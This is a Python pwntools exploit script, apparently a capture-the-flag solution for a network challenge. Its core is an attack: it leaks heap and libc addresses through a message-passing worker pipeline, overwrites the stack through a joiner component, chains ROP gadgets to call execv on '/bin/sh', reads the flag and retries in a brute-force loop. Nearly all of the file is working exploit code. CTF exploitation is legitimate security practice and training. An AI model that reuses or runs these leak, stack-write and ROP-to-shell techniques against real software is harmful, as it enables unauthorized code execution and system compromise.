#!/usr/bin/python3

from pwn import *


HOST = "chall.fcsc.fr"
PORT = 2104

vuln = ELF("./patched")
context.binary = vuln

libc = ELF("./libc.so.6")

POP_RDI = 0x10f75b
POP_RSI = 0x110a4d

KEY = b"\x5e\x5f\xc3\x3d\xb9\x27\x6f\x6e\xd8\xd5\xce\xeb\x1e\x0e\x75\x8d"


def start():
    global p
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.DOCKER:
        p = remote("localhost", 4000)
    else:
        p = process("./patched")

def send(payload:bytes):
    p.recvuntil(b"> ")
    p.sendline(payload)

def send_encode(payload:bytes):
    debug("Sending :")
    log.maybe_hexdump(payload, level=logging.DEBUG)
    send(b64e(payload).encode())

def recv():
    head = p.recvuntil(b"[encoder] ", timeout=0.1)
    if not head.endswith(b"[encoder] "):
        raise EOFError
    res = p.recvline(keepends=False)
    return res

def recv_decode():
    res = b64d(recv())
    debug("Receiving :")
    log.maybe_hexdump(res, level=logging.DEBUG)
    return res

def leak():

    #leak stuff thanks to the encoder
    payload = b""

    #feed all workers
    payload += 0x10*b"A"*(0x100-5)

    #msg for interface, first byte == 0x01 if exit loop
    payload += 0x10*b"B"
    #msg for decoder, make it null to prevent breaking anything
    payload += 0x10*b"\0"
    #msg for splitter, make it size 0 to prevent breaking anything
    payload += 0x10*b"\0"
    #msg for joiner, something innocuous
    offset = 0
    payload += p16(offset) + 14*b"C"
    #msg for encoder, leak stuff
    leak_size = 0x2000
    payload += p16(leak_size) + 14*b"D"

    assert len(payload) %0x10 == 0


    send_encode(payload)
    leak = recv_decode()
    assert leak[:14] == 14*b"D"
    idx = 0x24
    ptr = 0
    while idx < leak_size:
        mangled_ptr = u64(leak[idx:idx+8])
        if mangled_ptr:
            if mangled_ptr & 0xfffffffff == mangled_ptr:
                ptr = mangled_ptr << 12
                break

        idx += 0x30
    if not ptr:
        debug("Did not find suitable leak")
        return 0
    #info(f"leaked pointer: {ptr:#x}")
    if ptr & 0xffff00000000 == 0:
        return 0
    return ptr
   
    
def joiner_write(offset:int, small_payload:bytes, interface_msg=0x10*b"\x01"):
    assert len(small_payload) == 0x10 - 2

    payload = b""

    workers_count = 0x100 - 5 + 4

    #feed all workers
    payload += 0x10*b"A"*(0x100-5)

    #msg for interface, first byte == 0x01 if exit loop
    payload += interface_msg
    #msg for decoder, make it null to prevent breaking anything
    payload += 0x10*b"\0"
    #msg for splitter, make it size 0 to prevent breaking anything
    payload += 0x10*b"\0"
    #msg for joiner, write on stack
    offset = workers_count + offset
    payload += p16(offset) + small_payload

    assert len(payload) %0x10 == 0
    assert len(payload) // 0x10 == workers_count


    send_encode(payload)

def poc_codexec():
    start()
    joiner_write(6, 8*b"A" + pack(0xdeadbeef, 6*8), 0x10*b"\x01")
    p.recvuntil(b">")
    pause()
    p.sendline(b"AAAA")
    p.interactive()


def write_ropchain(rop_chain:list[int], idx, terminate=False):

    assert len(rop_chain)%2 == 0
    iterations = len(rop_chain)//2

    workers_count = 0x100 * iterations - 1
    payload = b""
    for i in range(iterations):

        small_payload = p64(rop_chain[2*i]) + pack(rop_chain[2*i+1], 6*8)
        if terminate and i == iterations - 1:
            interface_msg = 0x10*b"\x01"
        else:
            interface_msg = 0x10*b"B"
        #feed all workers
        payload += 0x10*b"A"*(0x100-5)

        #msg for interface, first byte == 0x01 if exit loop
        payload += interface_msg
        #msg for decoder, make it null to prevent breaking anything
        payload += 0x10*b"\0"
        #msg for splitter, make it size 0 to prevent breaking anything
        payload += 0x10*b"\0"
        #msg for joiner, write on stack
        offset = workers_count + idx + i
        payload += p16(offset) + small_payload
        if i != iterations - 1:
            #message for encoder, size 0 to prevent breaking anything
            payload += 0x10*b"\0"

    assert len(payload) %0x10 == 0
    assert len(payload) // 0x10 == workers_count

    send_encode(payload)

    
def attack(cheat=False):
    start()
    ptr = 0
    while not ptr:
        #pause()
        ptr = leak()
        print(f"{ptr:#x}")
    assert ptr & 0xf00000 == 0
    ptr_low = ptr & 0xff000
    ptr_base = ptr & 0xffffff000000
    info(f"{ptr_base=:#x}")

    thread_addr = ptr_base + 0x1ee0
    ptr = ptr_base


    ptr += 0x21000
    ptr += 0x0000000003fdf000

    info(f"Big chunk start @ {ptr:#x}")


    #move join_buffer to chunk
    #race to leak libc: overwrite joined_count and join_buffer
    stack_content = [
        0x1f8, #joined_count, needs tuning
        thread_addr, #&thread, must be preserved to receive messages
        ptr + 0x8a0, #libc leak in the heap
        0, #r_msg, set to 0 so free does not complain

    ]
    #pause()
    #joiner_write(4, p64(ptr + 0x8a0) + 6*b"\0", 0x10*b"B")
    write_ropchain(stack_content, 3)
    
    #joiner_write(3, p64(0x100-5+4-0) + 6*b"\0")
    mb_leak = recv_decode()
    libc_addr = u64(mb_leak[:8])
    if libc_addr & 0xffffffffffff != libc_addr:
        error(f"{libc_addr:#x} does not look like a libc addr...")
    libc.address = libc_addr - 0x203ac0


    """
    if cheat:
        libc.address = int(input("Please give libc: "), 16)
    else:
        #bf
        if args.REMOTE:
            offset = 0xa7eb000
        elif args.DOCKER:
            offset = 0xa7eb000
        else:
            offset = 0xda00000
        
        libc.address = ptr_base + offset

    """
    info(f"libc @ {libc.address:#x}")

    #pause()



    rop_chain = [
        0xdeadbeef, #rbp
        libc.address + POP_RDI,
        next(libc.search(b"/bin/sh")),
        libc.address + POP_RSI,
        0,
        libc.symbols["execv"]
    ]
    #rop_chain = [0xdeadbeef for _ in range(6)]
    write_ropchain(rop_chain, 6, True)
    p.recvuntil(b"\n> ")
    p.sendline(b"aaaa")
    p.recvuntil(b"[decoder] OK\n")
    p.sendline(b"cat flag.txt")
    flag = p.recvline(keepends=False).decode()
    info(flag)
    p.interactive()
    p.close()

def attack_bf():
    while True:
        try:
            attack()
            print("Attack succeeded!")
            return
        except (EOFError, PwnlibException):
            p.close()


attack_bf()